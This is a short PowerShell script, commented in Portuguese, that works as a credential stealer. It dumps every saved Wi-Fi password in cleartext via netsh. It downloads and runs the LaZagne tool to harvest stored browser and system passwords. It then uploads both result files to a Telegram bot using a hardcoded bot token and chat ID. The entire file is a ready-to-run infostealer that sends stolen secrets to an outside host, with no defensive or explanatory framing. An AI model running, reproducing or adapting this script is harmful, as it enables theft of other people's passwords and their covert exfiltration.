# Coletar senhas Wi-Fi
$wifiOutput = ""
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    ($_ -split ":")[1].Trim()
}

foreach ($profile in $profiles) {
    $result = netsh wlan show profile name="$profile" key=clear
    $keyLine = ($result | Select-String "Key Content")
    $pass = if ($keyLine) { ($keyLine -split ":")[1].Trim() } else { "Sem senha encontrada" }
    $wifiOutput += "`n$profile : $pass"
}
$wifiFile = "$env:TEMP\wifi.txt"
$wifiOutput | Out-File $wifiFile

# Baixar LaZagne
$laZagneURL = "https://github.com/AlessandroZ/LaZagne/releases/latest/download/lazagne.exe"
$laZagnePath = "$env:TEMP\lazagne.exe"
Invoke-WebRequest -Uri $laZagneURL -OutFile $laZagnePath -UseBasicParsing

# Executar LaZagne e salvar output
$browserFile = "$env:TEMP\browser.txt"
Start-Process -FilePath $laZagnePath -ArgumentList "all" -NoNewWindow -Wait -RedirectStandardOutput $browserFile
Start-Sleep -Seconds 3

# Função para enviar arquivos para o Telegram
function Send-TelegramFile {
    param (
        [string]$Token,
        [string]$ChatId,
        [string]$FilePath
    )

    $uri = "https://api.telegram.org/bot$Token/sendDocument"
    $boundary = [System.Guid]::NewGuid().ToString()
    $contentType = "multipart/form-data; boundary=$boundary"

    # Ler o arquivo
    $fileName = [System.IO.Path]::GetFileName($FilePath)
    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $fileEnc = [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($fileBytes)

    # Construir o corpo da requisição
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"chat_id`"",
        "",
        $ChatId,
        "--$boundary",
        "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"",
        "Content-Type: application/octet-stream",
        "",
        $fileEnc,
        "--$boundary--"
    ) -join "`r`n"

    # Enviar a requisição
    try {
        $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType $contentType -Body $bodyLines
        Write-Output "Arquivo $fileName enviado com sucesso."
    } catch {
        Write-Output "Erro ao enviar $fileName : $_"
    }
}

# Enviar arquivos para o Telegram
$token = "7875549832:AAGBdj5P0_WZwA2CTzwsl5BxmMsEBK-A-zw"
$chatid = "5400490425"

Send-TelegramFile -Token $token -ChatId $chatid -FilePath $wifiFile
Send-TelegramFile -Token $token -ChatId $chatid -FilePath $browserFile
